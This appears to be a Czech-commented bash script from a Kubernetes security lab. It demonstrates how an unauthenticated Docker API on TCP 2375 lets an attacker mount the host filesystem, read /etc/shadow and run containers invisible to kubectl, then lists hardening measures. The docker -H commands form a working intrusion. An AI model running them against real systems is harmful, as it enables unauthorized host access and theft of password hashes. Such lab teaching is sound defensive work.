#!/usr/bin/env bash
# 09 — AC9: KLÍČOVÁ NÁVAZNOST NA TeamTNT (projekt A).
# Když worker-node (VM2) vystavuje Docker API na TCP 2375, útočník přes něj spustí
# kontejner s přístupem k FS hostitele MIMO Kubernetes — kubectl ho vůbec nevidí.
# Pointa: RBAC/PSA tento vektor NEŘEŠÍ, obrana musí být i na hostiteli (viz 10-host-hardening.sh).
#
# BEZPEČNOST: vše běží jen proti VLASTNÍ laboratorní VM2. Žádný malware, žádná těžba.
# Čteme vlastní /etc/shadow jen jako důkaz expozice host FS. Skript nejdřív bezpečně
# zjistí, zda je API otevřené; když ne, scénář jen vysvětlí/nasimuluje.
set -euo pipefail
source "$(dirname "$0")/lib.sh"
source "$(dirname "$0")/env.sh" 2>/dev/null || true
require_kubectl
# Fallback, kdyz na nodu neni samostatna binarka kubectl (jen "k3s kubectl"):
if ! command -v kubectl >/dev/null 2>&1; then kubectl() { k3s kubectl "$@"; }; fi

DOCKER_NODE_HOST="${DOCKER_NODE_HOST:-${DOCKER_NODE_IP:-}}"
DOCKER_API_PORT="${DOCKER_API_PORT:-2375}"
# Název sladěný s teardown.sh (maže kontejnery teamtnt-demo*) → automatický úklid.
MARKER="teamtnt-demo"

bad "Scénář (AC9 / TeamTNT): Docker API na VM2 vystavené na TCP $DOCKER_API_PORT."
say "Z projektu A víme: kdo ovládne Docker API, spustí libovolný kontejner s mountem hostitele."
say "Tady navíc ukážeme, že Kubernetes o takovém kontejneru NEVÍ."
pause

if [[ -z "$DOCKER_NODE_HOST" ]]; then
  warn "DOCKER_NODE_HOST není nastavené v env.sh → scénář jen vysvětlím (bez živého spojení)."
  echo "   Nastav v env.sh: DOCKER_NODE_HOST (IP VM2) a volitelně DOCKER_API_PORT (default 2375)."
fi

echo
say "1) BEZPEČNÁ detekce, zda je Docker API otevřené (dotaz na /version, timeout 3s):"
API_OPEN=0
if [[ -n "$DOCKER_NODE_HOST" ]]; then
  echo "\$ curl -fsS -m 3 http://$DOCKER_NODE_HOST:$DOCKER_API_PORT/version"
  if curl -fsS -m 3 "http://$DOCKER_NODE_HOST:$DOCKER_API_PORT/version" >/dev/null 2>&1; then
    API_OPEN=1
    bad "Docker API je OTEVŘENÉ a bez autentizace — kdokoli na síti ho může ovládat."
  else
    good "Docker API na $DOCKER_NODE_HOST:$DOCKER_API_PORT se neozvalo (zavřené/filtrované)."
  fi
fi
pause

if [[ "$API_OPEN" == "1" ]] && command -v docker >/dev/null 2>&1; then
  echo
  say "2) (a) Přes OTEVŘENÉ API spustíme kontejner s mountem / VLASTNÍ VM2 a přečteme /etc/shadow:"
  echo "   (jen vlastní laboratorní VM — důkaz, že API = plný přístup k FS hostitele)"
  run docker -H "tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT" run --rm -v /:/host:ro ${IMG_TOOLS} \
    sh -c 'head -n 3 /host/etc/shadow'
  bad "Čtení /etc/shadow hostitele bez jakéhokoli oprávnění v Kubernetes."
  pause

  echo
  say "2) (b) Spustíme kontejner MIMO Kubernetes a porovnáme dvě evidence:"
  docker -H "tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT" rm -f "$MARKER" >/dev/null 2>&1 || true
  run docker -H "tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT" run -d --name "$MARKER" ${IMG_TOOLS} sleep 300
  echo
  say "   Docker na VM2 ho VIDÍ:"
  run docker -H "tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT" ps --filter "name=$MARKER" --format '   {{.Names}}  {{.Image}}  {{.Status}}'
  echo
  say "   Ale Kubernetes ho NEVIDÍ (projdi celý výpis — '$MARKER' tam není):"
  run kubectl get pods -A -o wide | grep "$MARKER" && bad "neočekávané" || good "kubectl '$MARKER' nezná → kontejner běží mimo veškerý dohled a RBAC/PSA Kubernetes."
  echo
  warn "Úklid markeru:"
  docker -H "tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT" rm -f "$MARKER" >/dev/null 2>&1 || true
else
  echo
  say "2) API není dostupné (nebo chybí docker klient) → scénář jen NASIMULUJEME:"
  echo "   Kdyby bylo API otevřené, útočník by spustil:"
  echo "     docker -H tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT run --rm -v /:/host:ro alpine \\"
  echo "        sh -c 'head -n 3 /host/etc/shadow'        # čte FS hostitele"
  echo "     docker -H tcp://$DOCKER_NODE_HOST:$DOCKER_API_PORT run -d alpine sleep 300  # kontejner mimo k8s"
  echo "   Takový kontejner by se v 'kubectl get pods -A' NIKDY neobjevil."
  say "   (Pokud je API zavřené, obrana z 10-host-hardening.sh už nejspíš platí — to je dobře.)"
fi
pause

echo
warn "POINTA (návaznost na A): RBAC, PSA ani NetworkPolicy tento vektor NEŘEŠÍ —"
warn "útočník obchází celou řídicí vrstvu Kubernetes přes runtime hostitele."
good "Obrana (AC17, viz 10-host-hardening.sh): Docker API nevystavovat (jen unix socket,"
good "příp. mTLS na 2376) + firewall + userns-remap + no-new-privileges."
